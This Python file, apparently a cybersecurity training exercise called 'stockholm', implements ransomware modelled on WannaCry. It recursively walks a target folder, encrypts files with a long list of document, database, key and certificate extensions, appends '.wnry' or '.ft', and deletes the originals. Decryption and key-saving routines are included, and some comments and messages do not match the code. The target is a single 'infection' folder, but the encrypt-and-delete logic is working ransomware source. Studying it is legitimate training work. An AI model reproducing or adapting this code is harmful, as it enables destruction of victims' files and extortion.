from os import listdir, remove, system
from os.path import expanduser, isdir, join, splitext
import sys
import argparse
from cryptography.fernet import Fernet

is_silent = False  # Variable pour contrôler l'affichage des messages

allowed_extensions = [
    ".wannacry", ".wnry", ".wcry", ".wncry", ".wncrypt",
    ".wncryt", ".wnryt", ".wncrpt", ".wnrypt", ".wcrypt",
    ".wncrypt0r", ".wannacrypt", ".wannacrypt0r", ".wannacryptor",
    ".wncryptor", ".wannadecrypt0r", ".wannadecryptor",
    ".crypt", ".cry", ".crypted", ".crypt0r", ".cryptor",
    ".encrypted", ".enc", ".enc0r", ".encr", ".lock"]

allowed_extensions2 = [
".docx", ".ppam", ".sti", ".vcd", ".3gp", ".sch", ".myd", ".wb2",
".docb", ".potx", ".sldx", ".jpeg", ".mp4", ".dch", ".frm", ".slk",
".docm", ".potm", ".sldm", ".jpg", ".mov", ".dip", ".odb", ".dif",
".dot", ".pst", ".sldm", ".bmp", ".avi", ".pl", ".dbf", ".stc",
".dotm", ".ost", ".vdi", ".png", ".asf", ".vb", ".db", ".sxc",
".dotx", ".msg", ".vmdk", ".gif", ".mpeg", ".vbs", ".mdb", ".ots",
".xls", ".eml", ".vmx", ".raw", ".vob", ".ps1", ".accdb", ".ods",
".xlsm", ".vsdx", ".ARC", ".tiff", ".fla", ".js", ".sqlite3", ".max",
".xlsb", ".txt", ".PAQ", ".nef", ".swf", ".asm", ".asc", ".uot",
".xlt", ".csv", ".bz2", ".psd", ".wav", ".h", ".lay6", ".stw",
".xlm", ".rtf", ".tbk", ".ai", ".mp3", ".pas", ".lay", ".sxw",
".xlc", ".123", ".bak", ".svg", ".sh", ".cpp", ".mml", ".ott",
".xltx", ".wks", ".tar", ".djvu", ".class", ".c", ".sxm", ".odt",
".xltm", ".wk1", ".tgz", ".m4u", ".jar", ".cs", ".otg", ".pem",
".ppt", ".pdf", ".gz", ".m3u", ".java", ".suo", ".odg", ".p12",
".pptx", ".dwg", ".7z", ".mid", ".rb", ".sln", ".uop", ".csr",
".pptm", ".onetoc2", ".rar", ".wma", ".asp", ".ldf", ".std", ".crt",
".pot", ".snt", ".zip", ".flv", ".php", ".mdf", ".sxd", ".key",
".pps", ".hwp", ".backup", ".3g2", ".jsp", ".ibd", ".otp", ".pfx",
".ppsm", ".602", ".iso", ".mkv", ".brd", ".myi", ".odp", ".der",
".ppsx", ".sxi"]


def encrypt_wannacry(directory_path: str, key: Fernet):
    """
    Fonction récursive pour chiffrer les fichiers dans un répertoire et ses sous-répertoires.
    """
    try:
        name_list = listdir(directory_path)  # Liste des fichiers et dossiers dans le répertoire
    except Exception as e:
        if not is_silent:
            print('(for logging purposes) ' + str(e), file=sys.stderr)  # Affiche l'erreur en cas d'échec de la lecture du répertoire
        return
    for name in name_list:
        file_path = join(directory_path, name)  # Chemin complet du fichier
        if isdir(file_path):  # Vérifie si c'est un dossier
            encrypt_wannacry(file_path, key)  # Appel récursif pour chiffrer les fichiers dans le sous-répertoire
        else:
            file_extension = splitext(file_path)[1]  # Extension du fichier
            for ext in allowed_extensions2:
                if ext == file_extension:  # Vérifie si l'extension est autorisée pour le chiffrement
                    encrypted_file_path = file_path + '.wnry'  # Chemin du fichier chiffré
                    try:
                        with open(file_path, 'rb') as file_in:
                            raw_data = file_in.read()  # Lecture du contenu du fichier
                        with open(encrypted_file_path, 'wb') as file_out:
                            file_out.write(Fernet(key).encrypt(raw_data)) # Chiffrement du contenu et écriture dans le fichier chiffré
                        remove(file_path)  # Suppression du fichier d'origine
                        if not is_silent:
                            print('File encrypted: ' + file_path)  # Affiche le chemin du fichier chiffré
                        break
                    except Exception as e:
                        if not is_silent:
                            print('(for logging purposes) ' + str(e), file=sys.stderr)  # Affiche l'erreur en cas d'échec du chiffrement
                        pass

def encrypt_files_recursive(directory_path: str, key: Fernet):
    """
    Fonction récursive pour chiffrer les fichiers dans un répertoire et ses sous-répertoires.
    """
    try:
        name_list = listdir(directory_path)  # Liste des fichiers et dossiers dans le répertoire
    except Exception as e:
        if not is_silent:
            print('(for logging purposes) ' + str(e), file=sys.stderr)  # Affiche l'erreur en cas d'échec de la lecture du répertoire
        return
    for name in name_list:
        file_path = join(directory_path, name)  # Chemin complet du fichier
        if isdir(file_path):  # Vérifie si c'est un dossier
            encrypt_files_recursive(file_path, key)  # Appel récursif pour chiffrer les fichiers dans le sous-répertoire
        else:
            file_extension = splitext(file_path)[1]  # Extension du fichier
            for ext in allowed_extensions:
                if ext == file_extension:  # Vérifie si l'extension est autorisée pour le chiffrement
                    encrypted_file_path = file_path + '.ft'  # Chemin du fichier chiffré
                    try:
                        with open(file_path, 'rb') as file_in:
                            raw_data = file_in.read()  # Lecture du contenu du fichier
                        with open(encrypted_file_path, 'wb') as file_out:
                            file_out.write(Fernet(key).encrypt(raw_data)) # Chiffrement du contenu et écriture dans le fichier chiffré
                        remove(file_path)  # Suppression du fichier d'origine
                        if not is_silent:
                            print('File encrypted: ' + file_path)  # Affiche le chemin du fichier chiffré
                        break
                    except Exception as e:
                        if not is_silent:
                            print('(for logging purposes) ' + str(e), file=sys.stderr)  # Affiche l'erreur en cas d'échec du chiffrement
                        pass


def decrypt_wannacry(directory_path: str, key: Fernet):
    """
    Fonction récursive pour déchiffrer les fichiers chiffrés dans un répertoire et ses sous-répertoires.
    """
    for name in listdir(directory_path):
        file_path = join(directory_path, name)  # Chemin complet du fichier
        if isdir(file_path):  # Vérifie si c'est un dossier
            decrypt_wannacry(file_path, key)  # Appel récursif pour déchiffrer les fichiers dans le sous-répertoire
        else:
            file_data = splitext(file_path)
            if file_data[1] == '.wnry':  # Vérifie si le fichier a l'extension de fichier chiffré
                decrypted_file_path = file_data[0]  # Chemin du fichier déchiffré
                try:
                    with open(file_path, 'rb') as file_in:
                        encrypted_data = file_in.read()  # Lecture du contenu du fichier chiffré
                    recovered_data = key.decrypt(encrypted_data)  # Déchiffrement du contenu
                    with open(decrypted_file_path, 'wb') as file_out:
                        file_out.write(recovered_data)  # Écriture du contenu déchiffré dans le fichier déchiffré
                    remove(file_path)  # Suppression du fichier chiffré
                    if not is_silent:
                        print('File decrypted: ' + decrypted_file_path)  # Affiche le chemin du fichier déchiffré
                except Exception:
                    pass

def decrypt_files_recursive(directory_path: str, key: Fernet):
    """
    Fonction récursive pour déchiffrer les fichiers chiffrés dans un répertoire et ses sous-répertoires.
    """
    for name in listdir(directory_path):
        file_path = join(directory_path, name)  # Chemin complet du fichier
        if isdir(file_path):  # Vérifie si c'est un dossier
            decrypt_files_recursive(file_path, key)  # Appel récursif pour déchiffrer les fichiers dans le sous-répertoire
        else:
            file_data = splitext(file_path)
            if file_data[1] == '.ft':  # Vérifie si le fichier a l'extension de fichier chiffré
                decrypted_file_path = file_data[0]  # Chemin du fichier déchiffré
                try:
                    with open(file_path, 'rb') as file_in:
                        encrypted_data = file_in.read()  # Lecture du contenu du fichier chiffré
                    recovered_data = key.decrypt(encrypted_data)  # Déchiffrement du contenu
                    with open(decrypted_file_path, 'wb') as file_out:
                        file_out.write(recovered_data)  # Écriture du contenu déchiffré dans le fichier déchiffré
                    remove(file_path)  # Suppression du fichier chiffré
                    if not is_silent:
                        print('File decrypted: ' + decrypted_file_path)  # Affiche le chemin du fichier déchiffré
                except Exception:
                    pass


def save_key_in_file(keyfile, key):
    key = Fernet.generate_key()       # Génération d'une nouvelle clé
    with open(keyfile, 'wb') as f:    # Ouverture du fichier clé en mode binaire
        f.write(key)                 # Écriture de la clé générée dans le fichier
    print('Key was successfully saved in {}.'.format(keyfile))   # Affichage d'un message de confirmation


def main() -> int:
    parser = argparse.ArgumentParser(description='File Encryption/Decryption')

    parser.add_argument('-v', '--version', help='show version', action='version',
                        version='stockholm:piscine_cybersecurity_mulhouse, v1.0')
    parser.add_argument('-r', '--reverse', type=str, help='reverse encryption',
                        metavar=('DECRYPT_KEY'))
    parser.add_argument('-o', '--wannacryreverse', type=str, help='reverse wannacry encryption',
                        metavar=('DECRYPT_KEY'))
    parser.add_argument('-w', '--wannacry', help='wannacry encryption', action='store_true')
    parser.add_argument('-s', '--silent', help='does not show output', action='store_true')
    args = parser.parse_args()

    global is_silent
    is_silent = args.silent  # Met à jour la variable is_silent en fonction de l'argument -s/--silent

    home_path = expanduser('~')  # Chemin du répertoire utilisateur
    home_path = home_path + "/Desktop"
    if not (home_path and isdir(home_path)):  # Vérifie si le répertoire utilisateur existe
        print('Fatal error: user has no directory to infect', file=sys.stderr)  # Affiche une erreur en cas de répertoire utilisateur inexistant
        return 1
    target_path = join(home_path, 'infection')  # Chemin du répertoire cible
    if not isdir(target_path):  # Vérifie si le répertoire cible existe
        print('Fatal error: target directory does not exist in user home directory', file=sys.stderr)  # Affiche une erreur en cas de répertoire cible inexistant
        return 1

    if args.reverse:
        try:
            key = Fernet(args.reverse)  # Clé de chiffrement fournie pour déchiffrer les fichiers
        except Exception:
            print('Invalid key provided')  # Affiche une erreur en cas de clé de chiffrement invalide
            return 1
        decrypt_files_recursive(target_path, key)  # Appel de la fonction de déchiffrement récursif
        return 0
    if args.wannacryreverse:
        try:
            key = Fernet(args.wannacryreverse)  # Clé de chiffrement fournie pour déchiffrer les fichiers
        except Exception:
            print('Invalid key provided')  # Affiche une erreur en cas de clé de chiffrement invalide
            return 1
        decrypt_wannacry(target_path, key)  # Appel de la fonction de déchiffrement récursif
        return 0
    elif args.wannacry:
        key = Fernet.generate_key()       # Génération d'une nouvelle clé
        if len(key) < 16: # Vérifier si la clé a une longueur de 64 caractères hexadécimaux
            print('Error: key must be 16 characters.') # Si la clé n'a pas une longueur de 64 caractères hexadécimaux, imprimer un message d'erreur
            exit(1) # Sortir du programme avec un code d'erreur
        with open('keyWannacry.txt', 'wb') as f:    # Ouverture du fichier clé en mode binaire
            f.write(key)                 # Écriture de la clé générée dans le fichier
        print('Key was successfully saved in {}.'.format('key.txt'))   # Affichage d'un message de confirmation
        encrypt_wannacry(target_path, key)  # Appel de la fonction de chiffrement récursif
        return 0
    else:
        key = Fernet.generate_key()       # Génération d'une nouvelle clé
        if len(key) < 16: # Vérifier si la clé a une longueur de 64 caractères hexadécimaux
            print('Error: key must be 16 characters.') # Si la clé n'a pas une longueur de 64 caractères hexadécimaux, imprimer un message d'erreur
            exit(1) # Sortir du programme avec un code d'erreur
        with open('key.txt', 'wb') as f:    # Ouverture du fichier clé en mode binaire
            f.write(key)                 # Écriture de la clé générée dans le fichier
        print('Key was successfully saved in {}.'.format('key.txt'))   # Affichage d'un message de confirmation
        encrypt_files_recursive(target_path, key)  # Appel de la fonction de chiffrement récursif
        return 0


if __name__ == "__main__":
    sys.exit(main())  # Appel de la fonction principale et sortie du programme avec le code de retour retourné par la fonction
